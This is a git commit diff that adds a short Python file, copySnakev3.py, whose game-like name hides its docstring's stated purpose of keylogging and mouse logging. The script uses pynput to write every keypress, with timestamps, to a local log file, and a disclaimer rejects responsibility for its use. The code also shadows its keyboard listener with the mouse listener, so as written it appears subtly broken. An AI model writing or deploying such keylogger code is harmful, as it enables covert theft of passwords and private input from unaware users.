394e621e3b389fb2e0e06fe83d104b334fce1a12
M. Zulfiqar WARDI <mzulfiqar.wardi@gmail.com>
2017-12-16 01:12:58 +0100

    half edited v3

---
+++ project_1/copySnakev3.py
@@ -0,0 +1,20 @@
+"""
+Advanced keylogging and mouse logging using the pynput library.
+
+DISCLAIMER :The creator of this script take no responsibility for any purposes regarding the usage of the script.
+"""
+
+from pynput.keyboard import Key, Listener
+from pynput.mouse import Listener
+
+import logging
+
+log_path = "." #modify where you want to put the path (use ABSOLUTE PATH)
+
+logging.basicConfig(filename=(log_path + "/cS_logv1.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')
+
+def on_type_key(key):
+    logging.info(key)
+
+with Listener(on_press=on_type_key) as listener:
+    listener.join()
